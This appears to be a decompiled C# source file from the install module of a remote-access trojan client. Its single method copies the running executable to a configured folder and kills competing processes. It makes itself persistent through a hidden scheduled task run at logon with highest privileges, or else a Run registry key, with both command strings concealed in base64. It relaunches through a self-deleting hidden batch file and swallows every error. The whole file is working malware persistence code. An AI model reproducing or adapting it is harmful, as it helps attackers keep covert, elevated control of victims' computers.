using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Client.Helper;
using Microsoft.Win32;

namespace Client.Install
{
	// Token: 0x02000009 RID: 9
	internal class NormalStartup
	{
		// Token: 0x06000035 RID: 53 RVA: 0x000036D8 File Offset: 0x000018D8
		public static void Install()
		{
			try
			{
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder), Settings.Install_File));
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (fileName != fileInfo.FullName)
				{
					foreach (Process process in Process.GetProcesses())
					{
						try
						{
							if (process.MainModule.FileName == fileInfo.FullName)
							{
								process.Kill();
							}
						}
						catch
						{
						}
					}
					if (Methods.IsAdmin())
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd",
							Arguments = string.Concat(new string[]
							{
								Encoding.Default.GetString(Convert.FromBase64String("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")),
								"\"",
								Path.GetFileNameWithoutExtension(fileInfo.Name),
								"\" /tr '\"",
								fileInfo.FullName,
								"\"' & exit"
							}),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						});
					}
					else
					{
						using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))
						{
							registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
						}
					}
					if (File.Exists(fileInfo.FullName))
					{
						File.Delete(fileInfo.FullName);
						Thread.Sleep(1000);
					}
					Stream stream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
					byte[] array = File.ReadAllBytes(fileName);
					stream.Write(array, 0, array.Length);
					Methods.ClientOnExit();
					string text = Path.GetTempFileName() + ".bat";
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("@echo off");
						streamWriter.WriteLine("timeout 3 > NUL");
						streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
						streamWriter.WriteLine("CD " + Path.GetTempPath());
						streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
					}
					Process.Start(new ProcessStartInfo
					{
						FileName = text,
						CreateNoWindow = true,
						ErrorDialog = false,
						UseShellExecute = false,
						WindowStyle = ProcessWindowStyle.Hidden
					});
					Environment.Exit(0);
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
